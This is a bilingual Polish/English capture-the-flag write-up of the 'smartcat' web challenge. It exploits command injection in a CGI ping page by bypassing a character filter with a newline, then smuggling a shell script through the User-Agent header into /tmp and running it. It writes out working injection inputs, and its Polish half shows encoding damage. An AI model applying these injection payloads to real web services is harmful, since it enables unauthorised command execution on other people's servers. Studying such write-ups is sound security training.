##smartcat (Web, 50+50p)

###PL
[ENG](#eng-version)

W zadaniu dostajemy do dyspozycji webowy interfejs (CGI) pozwalaj�cy pignowa� wskazanego hosta. 
Domy�lamy si�, �e pod spodem operacja jest realizowana jako wywo�anie `ping` w shellu z doklejonym podanym przez nas adresem.

#### Smartcat1

Pierwsza cz�� zadania polega na odczytaniu flagi znajduj�cej si� w nieznanym pliku, wi�c wymaga od nas jedynie mo�liwo�ci czytania plik�w.
Operatory:
	 $;&|({`\t 

s� zablokowane, ale zauwa�amy, �e znak nowej linii `\n` jest wyj�tkiem.
Mo�emy dzi�ki temu wykona� dowoln� komend� podaj�c na wej�ciu np.

`localhost%0Als`

Co zostanie potraktowane jako 2 osobne komendy - `ping localhost` oraz `ls`

Wywo�anie `ls` pozwala stwierdzi�, �e w bierz�cym katalogu jest katalog `there`, ale nie mamy mo�liwo�ci listowa� go bez u�ycia spacji. Po chwili namys�u wpadli�my na pomys� �eby u�y� programu `find` kt�ry da� nam:

```
.
./index.cgi
./there
./there/is
./there/is/your
./there/is/your/flag
./there/is/your/flag/or
./there/is/your/flag/or/maybe
./there/is/your/flag/or/maybe/not
./there/is/your/flag/or/maybe/not/what
./there/is/your/flag/or/maybe/not/what/do
./there/is/your/flag/or/maybe/not/what/do/you
./there/is/your/flag/or/maybe/not/what/do/you/think
./there/is/your/flag/or/maybe/not/what/do/you/think/really
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
```

Pozosta�o nam tylko wywo�a� `cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag` i uzyska� flag�:

`INS{warm_kitty_smelly_kitty_flush_flush_flush}`

#### Smartcat2

Druga cz�� zadania jest trudniejsza, poniewa� tre�� sugeruje, �e musimy odczyta� flag� przez co� znajduj�cego si� w katalogu `/home/smartcat/` oraz, �e potrzebny b�dzie do tego shell.
Zauwa�amy po pewnym czasie, �e mo�emy tworzy� pliki w katalogu `/tmp`. 
Mo�emy tak�e uruchamia� skrypty shell przez `sh<script.sh`, ale nadal mieli�my problem z tym, jak umie�ci� w skrypcie interesuj�c� nas zawarto��.
Wreszcie wpadli�my na to, �e istniej� pewne zmienne, na kt�rych zawarto�� mo�emy wp�yn�� - nag��wki http.
W szczeg�lno�ci mo�emy w dowolny spos�b ustawi� sw�j `user-agent`. 
Nast�pnie mo�emy zawarto�� zmiennych �rodowiskowych wypisa� przez `env` a wynik tej operacji zrzuci� do pliku w `tmp`, a potem uruchomi� przez `sh</tmp/ourfile`.

Pierwsza pr�ba zawieraj�ca user-agent: `a; echo "koty" >/tmp/msm123; a` zako�czy�a si� sukcesem. 

Mogli�my wi�c z powodzeniem wykona� dowolny kod, w tym u�y� `nc` lub `pythona` do postawienia reverse-shell. Zamiast tego najpierw wylistowali�my katalog `/home/smartcat/` znajduj�c tam program `readflag`, kt�ry przed podaniem flagi wymaga� uruchomienia, odczekania kilku sekund i przes�ania komunikatu.
Wys�ali�my wi�c na serwer skrypt, kt�ry wykonywa� w�a�nie te czynno�ci z podanym programem i dostali�my:

	Flag:
				___
			.-"; ! ;"-.
		  .'!  : | :  !`.
		 /\  ! : ! : !  /\
		/\ |  ! :|: !  | /\
	   (  \ \ ; :!: ; / /  )
	  ( `. \ | !:|:! | / .' )
	  (`. \ \ \!:|:!/ / / .')
	   \ `.`.\ |!|! |/,'.' /
		`._`.\\\!!!// .'_.'
		   `.`.\\|//.'.'
			|`._`n'_.'|  hjw
			"----^----"

`INS{shells_are _way_better_than_cats}`

###ENG

In the task we get a web interface (CGI) for pinging selected host.
We predict that underneath this is calling `ping` from shell with adress we give.

#### Smartcat1-eng

First part of the task requires reading a flag residing in an unknown file, so we only need to be able to read files.
In the web interface characters 
	
	$;&|({`\t

are blocked, but we notice that newline character `\n` or `%0A` is an exception.
Thanks to that we can execute any command we want by using input:

`localhost%0Als`

This will be executed as 2 separate commands - `ping localhost` and `ls`

Calling `ls` shows us that in currend directory there is a `there` directory, but we can't list it since we can't use space. After a while we figure that we could use `find` which gived us:

	.
	./index.cgi
	./there
	./there/is
	./there/is/your
	./there/is/your/flag
	./there/is/your/flag/or
	./there/is/your/flag/or/maybe
	./there/is/your/flag/or/maybe/not
	./there/is/your/flag/or/maybe/not/what
	./there/is/your/flag/or/maybe/not/what/do
	./there/is/your/flag/or/maybe/not/what/do/you
	./there/is/your/flag/or/maybe/not/what/do/you/think
	./there/is/your/flag/or/maybe/not/what/do/you/think/really
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag


We call: `cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag` and get flag:

`INS{warm_kitty_smelly_kitty_flush_flush_flush}`

#### Smartcat2-eng

Second part is more difficult, since we task suggests we need to get the flag using something in `/home/smartcat/` dir and that we will need a shell for that.
After some work we notice that we can create files in `/tmp`.
We can also call shellscripts by `sh<scrupt.sh`, but we still didn't know how to place data we want inside the file.
Finally we figured that there are some environmental variables that we can set - http headers.
In particular we can set `user-agent` to any value we want.
We can then list those variables by `env` and save result of this operation to a file in `/tmp` and then run with `sh</tmp/ourfile`.

First attempt containing: `a; echo "koty" >/tmp/msm123; a` was successful.

Therefore, we could execute any code, including using `nc` or `python` to set a reverse-shell. Instead we started with listing `/home/smartcat/` directory, finding `readflag` binary, which requires us to execute it, wait few seconds and then send some message to get the flag.
Instead of the shell we simply sent a script which was doing exactly what `readflag` wanted and we got:

	Flag:
				___
			.-"; ! ;"-.
		  .'!  : | :  !`.
		 /\  ! : ! : !  /\
		/\ |  ! :|: !  | /\
	   (  \ \ ; :!: ; / /  )
	  ( `. \ | !:|:! | / .' )
	  (`. \ \ \!:|:!/ / / .')
	   \ `.`.\ |!|! |/,'.' /
		`._`.\\\!!!// .'_.'
		   `.`.\\|//.'.'
			|`._`n'_.'|  hjw
			"----^----"

`INS{shells_are _way_better_than_cats}`
